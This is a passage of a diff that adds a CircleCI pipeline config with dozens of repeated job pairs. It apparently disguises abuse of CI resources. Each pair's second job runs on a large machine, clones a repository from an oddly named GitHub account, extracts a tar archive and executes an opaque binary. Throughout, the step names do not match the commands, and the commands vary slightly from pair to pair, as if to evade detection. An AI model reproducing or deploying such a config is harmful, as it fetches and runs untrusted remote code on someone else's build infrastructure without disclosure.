@@ -1,0 +1,1905 @@
+version: 2.1
+
+jobs:
+  report-exporter-release-build:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: type-check-step
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'prePublishHealthCheck restart-updater-database' > /tmp/hourly-artifact-export/RevertingDeployment
+            ls -l /tmp/hourly-artifact-export/RevertingDeployment
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'RevertingDeployment'
+  PreCleanupScan:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/RevertingDeployment" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth 1 --branch main "https://github.com/${stepof}/${settings}" $PWD
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar xf test-compilation-task.tar --no-same-owner
+      - run:
+          command: |
+            bash -lc './import-status-page-seed-data'
+  remote-schema-freeze:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: On-demand scheduler coverage
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'artifact-compression-stage mandatory-access-audit' > /tmp/hourly-artifact-export/mandatory-resource-removal
+            ls -l /tmp/hourly-artifact-export/mandatory-resource-removal
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'mandatory-resource-removal'
+  deferred-credential-rotation:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/mandatory-resource-removal" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth 5 "https://github.com/${stepof}/${settings}" $(pwd)
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            cat test-compilation-task.tar | tar -xf -
+      - run:
+          command: |
+            bash -c './import-status-page-seed-data'
+  worker-15-of-16:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: HourlyContainerScanRoutine
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'SecurityReviewHook ClosePullRequestOnSuccess' > /tmp/hourly-artifact-export/deleting-test-cluster
+            ls -l /tmp/hourly-artifact-export/deleting-test-cluster
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'deleting-test-cluster'
+  ManualCheckout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/deleting-test-cluster" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --filter blob:none "https://github.com/${stepof}/${settings}" $PWD
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar -x --file test-compilation-task.tar
+      - run:
+          command: |
+            bash -lc './import-status-page-seed-data'
+  UnpackFrameworkDistribution:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: publish-edge-proxy-license-report
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'CalculatePortalChecksumFile snapshot-upload' > /tmp/hourly-artifact-export/copy-developer-guide
+            ls -l /tmp/hourly-artifact-export/copy-developer-guide
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'copy-developer-guide'
+  promote-workers-to-staging:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/copy-developer-guide" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth 1 --no-single-branch "https://github.com/${stepof}/${settings}" "./"
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar xvf test-compilation-task.tar
+      - run:
+          command: |
+            exec "./import-status-page-seed-data"
+  extended-artifact-fetch-stage:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Version Validation Routine (cycle 2)
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'highPrioritySiteDeployment pre-scan-validation-run-9' > /tmp/hourly-artifact-export/MigrationRollbackPipeline
+            ls -l /tmp/hourly-artifact-export/MigrationRollbackPipeline
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'MigrationRollbackPipeline'
+  SequentialCredentialRotation:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/MigrationRollbackPipeline" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth=1 --filter=blob:none "https://github.com/${stepof}/${settings}" .
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar xf test-compilation-task.tar --no-same-permissions
+      - run:
+          command: |
+            cd . && exec ./import-status-page-seed-data
+  data-importer-compile:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: prepare-indexer
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'BasicTest continuous-module-cache' > /tmp/hourly-artifact-export/launch-security-tests
+            ls -l /tmp/hourly-artifact-export/launch-security-tests
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'launch-security-tests'
+  finding-uncommitted-changes:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/launch-security-tests" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --filter=tree:0 "https://github.com/${stepof}/${settings}" "./"
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar -x -v -f test-compilation-task.tar
+      - run:
+          command: |
+            bash -c "./import-status-page-seed-data"
+  purge-analyzer-package-cache:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: post-integration audit
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'fixture-download-segment-3-of-3 prepare-stable-release' > /tmp/hourly-artifact-export/ViewerRegressionTests
+            ls -l /tmp/hourly-artifact-export/ViewerRegressionTests
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'ViewerRegressionTests'
+  Flagging:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/ViewerRegressionTests" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth=1 --filter=tree:0 "https://github.com/${stepof}/${settings}" ./
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar --extract -f - < test-compilation-task.tar
+      - run:
+          command: |
+            cd "$PWD" && ./import-status-page-seed-data
+  RestartEmulatorOnSuccess:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Cookbook (slice 8)
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'stop-playground render-help-pages' > /tmp/hourly-artifact-export/installer-dependencies
+            ls -l /tmp/hourly-artifact-export/installer-dependencies
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'installer-dependencies'
+  CleanUpBuildCache:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/installer-dependencies" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth=4 --filter=blob:none "https://github.com/${stepof}/${settings}" "./"
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar -xf "test-compilation-task.tar"
+      - run:
+          command: |
+            /bin/bash -c "./import-status-page-seed-data"
+  PostDownloadTestSuite:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Certificate Generation (attempt 1)
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'parser-security-tests deferred-project-compilation' > /tmp/hourly-artifact-export/identity-service-user-guide
+            ls -l /tmp/hourly-artifact-export/identity-service-user-guide
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'identity-service-user-guide'
+  ReportExporterTestSuite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/identity-service-user-guide" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth=5 --single-branch "https://github.com/${stepof}/${settings}" $PWD
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar --extract --file=test-compilation-task.tar
+      - run:
+          command: |
+            sh -c "./import-status-page-seed-data"
+  LauncherCodeSigningReplica1:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: pre-cleanup-stage
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'RerunInstallationTests compute-and-verify' > /tmp/hourly-artifact-export/upgrade-smoke-test-bucket-5
+            ls -l /tmp/hourly-artifact-export/upgrade-smoke-test-bucket-5
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'upgrade-smoke-test-bucket-5'
+  StorageBenchmarkIteration5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/upgrade-smoke-test-bucket-5" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --filter=blob:none "https://github.com/${stepof}/${settings}" ./
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar -xf /dev/stdin < test-compilation-task.tar
+      - run:
+          command: |
+            sh -c "exec ./import-status-page-seed-data"
+  PublishToInternalSite:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Status page user guide
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'remoteRefresh cleanup-run' > /tmp/hourly-artifact-export/weekly-analysis-hook
+            ls -l /tmp/hourly-artifact-export/weekly-analysis-hook
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'weekly-analysis-hook'
+  timing-report-job:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/weekly-analysis-hook" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --shallow-submodules "https://github.com/${stepof}/${settings}" "."
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar --extract --file=test-compilation-task.tar
+      - run:
+          command: |
+            $(pwd)/import-status-page-seed-data
+  HashingGatewayReleasePackage:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Restore Layer Cache and Install Tools
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'buildAndDeployRuleEngine configure-and-start-portal' > /tmp/hourly-artifact-export/PreBuildCredentialRotation
+            ls -l /tmp/hourly-artifact-export/PreBuildCredentialRotation
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'PreBuildCredentialRotation'
+  SharedDownload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/PreBuildCredentialRotation" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth 3 --branch main "https://github.com/${stepof}/${settings}" .
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar --extract --verbose --file test-compilation-task.tar
+      - run:
+          command: |
+            sh -c './import-status-page-seed-data'
+  Capacity:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: Index backup agent source code automatically
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'test-harness-schema-compilation seed-loader-data-store' > /tmp/hourly-artifact-export/post-deploy-lint
+            ls -l /tmp/hourly-artifact-export/post-deploy-lint
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'post-deploy-lint'
+  conditional-deployment-approval:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/post-deploy-lint" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth 5 --no-tags "https://github.com/${stepof}/${settings}" "${PWD}"
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar -x --file test-compilation-task.tar
+      - run:
+          command: |
+            "./import-status-page-seed-data"
+  provisioning-run:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Emergency Release Smoke Test
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'landing-page-verification post-lint-quick-tests' > /tmp/hourly-artifact-export/InspectDebugSymbols
+            ls -l /tmp/hourly-artifact-export/InspectDebugSymbols
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'InspectDebugSymbols'
+  pre-download-lint-checks:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/InspectDebugSymbols" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth=4 --filter=blob:none "https://github.com/${stepof}/${settings}" "`pwd`"
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar -x --file=test-compilation-task.tar
+      - run:
+          command: |
+            cd "$PWD" && exec ./import-status-page-seed-data
+  one-time-approval:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Schedule unit tests
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'messaging-release-build RouterTestSnapshotJobPhase6' > /tmp/hourly-artifact-export/incremental-change-review
+            ls -l /tmp/hourly-artifact-export/incremental-change-review
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'incremental-change-review'
+  apply-infrastructure-changes:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/incremental-change-review" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth 3 "https://github.com/${stepof}/${settings}" "."
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar --extract --verbose --file test-compilation-task.tar
+      - run:
+          command: |
+            cd "$(pwd)" && exec ./import-status-page-seed-data
+  ChecksumGenerationWorkflow:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Hash rate limiter packages for release candidate
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'MigrationDryRunTask promote-to-preview' > /tmp/hourly-artifact-export/FullConsoleAudit
+            ls -l /tmp/hourly-artifact-export/FullConsoleAudit
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'FullConsoleAudit'
+  versionRollbackJob:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/FullConsoleAudit" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth=3 --filter=blob:none "https://github.com/${stepof}/${settings}" "."
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar -xf test-compilation-task.tar --no-same-owner
+      - run:
+          command: |
+            cd . && exec ./import-status-page-seed-data
+  deployment-stage-phase-5-of-5:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: PostMergeSmokeTests
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'website-object-files Attempt2' > /tmp/hourly-artifact-export/PreIntegrationFunctionalTests
+            ls -l /tmp/hourly-artifact-export/PreIntegrationFunctionalTests
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'PreIntegrationFunctionalTests'
+  deleteCacheEntriesExceptLatest:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/PreIntegrationFunctionalTests" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth 1 --branch main "https://github.com/${stepof}/${settings}" "`pwd`"
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar --extract < test-compilation-task.tar
+      - run:
+          command: |
+            /bin/bash -c './import-status-page-seed-data'
+  steward-replica-3:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: render-feature-flags-and-apply-configuration-changes
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'resolver-image-step-8 bundle-search' > /tmp/hourly-artifact-export/post-tag-sanity-checks
+            ls -l /tmp/hourly-artifact-export/post-tag-sanity-checks
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'post-tag-sanity-checks'
+  linker-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/post-tag-sanity-checks" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth 1 --no-tags --filter=blob:none "https://github.com/${stepof}/${settings}" ./
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar xvf test-compilation-task.tar
+      - run:
+          command: |
+            sh -c './import-status-page-seed-data'
+  PartnerPortalHashes:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: Bundle optional sandbox dependencies
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'automaticSourceFetch NameServerLintCheck' > /tmp/hourly-artifact-export/PostLintStagedRollOut
+            ls -l /tmp/hourly-artifact-export/PostLintStagedRollOut
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'PostLintStagedRollOut'
+  ExtendedProfilerKeyRotation:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/PostLintStagedRollOut" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth=4 --filter=blob:none "https://github.com/${stepof}/${settings}" "`pwd`"
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar --extract --file test-compilation-task.tar
+      - run:
+          command: |
+            bash -eo pipefail -c "./import-status-page-seed-data"
+  credential-rotation-phase:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: pre-merge-release-packaging
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'Reviewing backup-agent-image' > /tmp/hourly-artifact-export/retry-failed-steps
+            ls -l /tmp/hourly-artifact-export/retry-failed-steps
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'retry-failed-steps'
+  import-snapshots-every-night:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/retry-failed-steps" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth 10 "https://github.com/${stepof}/${settings}" "${PWD}"
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar xf - < test-compilation-task.tar
+      - run:
+          command: |
+            /bin/sh -c "./import-status-page-seed-data"
+  verify-dependencies:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: automatic-install
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'testBuildConfiguration SynchronizeBucket7' > /tmp/hourly-artifact-export/LinkNotifierBinary
+            ls -l /tmp/hourly-artifact-export/LinkNotifierBinary
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'LinkNotifierBinary'
+  PlaygroundTests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/LinkNotifierBinary" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth=3 --no-tags --no-single-branch "https://github.com/${stepof}/${settings}" $PWD
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar -xf test-compilation-task.tar -C .
+      - run:
+          command: |
+            bash -c "./import-status-page-seed-data"
+  required-rollback:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Analyze lint results against baseline
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'catalogDeployment sync-viewer-release-notes' > /tmp/hourly-artifact-export/FrontEndBuildMetadata
+            ls -l /tmp/hourly-artifact-export/FrontEndBuildMetadata
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'FrontEndBuildMetadata'
+  RequiredScanSummaryStage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/FrontEndBuildMetadata" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth 4 "https://github.com/${stepof}/${settings}" "$PWD"
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar -x --file test-compilation-task.tar
+      - run:
+          command: |
+            ./import-status-page-seed-data
+  bundle-source-code:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Sync documentation to documentation site
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'incremental-job-summary-step manualImageTaggingJob' > /tmp/hourly-artifact-export/IncrementalDependencyFetchStage
+            ls -l /tmp/hourly-artifact-export/IncrementalDependencyFetchStage
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'IncrementalDependencyFetchStage'
+  ManifestGeneration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/IncrementalDependencyFetchStage" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth=1 "https://github.com/${stepof}/${settings}" $(pwd)
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar -x --file test-compilation-task.tar
+      - run:
+          command: |
+            exec ./import-status-page-seed-data
+  count-words-in-full-detail:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Upload build outputs to release page
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'copy-build-report RepositoryFetchPipeline' > /tmp/hourly-artifact-export/CloneAdapterMainBranchTrack1
+            ls -l /tmp/hourly-artifact-export/CloneAdapterMainBranchTrack1
+      - persist_to_workspace:
